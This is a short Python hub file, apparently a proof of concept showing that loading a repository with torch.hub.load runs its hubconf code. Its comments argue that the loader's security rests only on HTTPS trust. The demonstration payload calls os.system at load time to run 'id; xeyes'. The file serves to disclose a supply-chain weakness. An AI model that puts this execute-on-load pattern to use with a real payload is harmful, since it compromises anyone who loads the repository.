# Sample hub file to exec commands (trivially).
#
# Trigger by
#
# model = torch.hub.load('stealth/tensor-pwn', '')
#
# Note that this does not require any Pickle data to be loaded.
#
# If the repo-name was something more trustworthy, torchhub
# still depends solely on HTTPS/CA-bundle being trusted. This
# is to doubt and why e.g. golang adds more layers of security when
# fetching modules. It also doesn't matter whether in future the pytorch
# unpickler only loads weights and avoids arbitrary commands in Pickle
# files if you can just add python scripts to be executed to the repo.

dependencies = []

import os

os.system("id; xeyes")

